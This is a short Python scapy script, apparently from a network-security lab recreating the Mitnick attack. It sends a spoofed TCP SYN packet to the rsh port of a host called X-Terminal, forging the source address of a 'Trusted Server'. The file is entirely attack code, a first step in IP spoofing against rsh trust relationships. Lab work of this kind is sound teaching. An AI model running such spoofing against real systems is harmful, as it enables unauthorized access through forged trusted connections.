#!/usr/bin/python3
from scapy.all import *

# Define IPs and ports for the connection
x_ip = "10.9.0.5"     # X-Terminal IP
x_port = 514          # rsh service port on X-Terminal
srv_ip = "10.9.0.6"   # Trusted Server IP
srv_port = 1023       # Source port for the SYN packet

# Send a spoofed SYN packet
syn_pkt = IP(src=srv_ip, dst=x_ip) / TCP(sport=srv_port, dport=x_port, flags="S", seq=1000)
send(syn_pkt)
print("Spoofed SYN packet sent from Trusted Server to X-Terminal.")
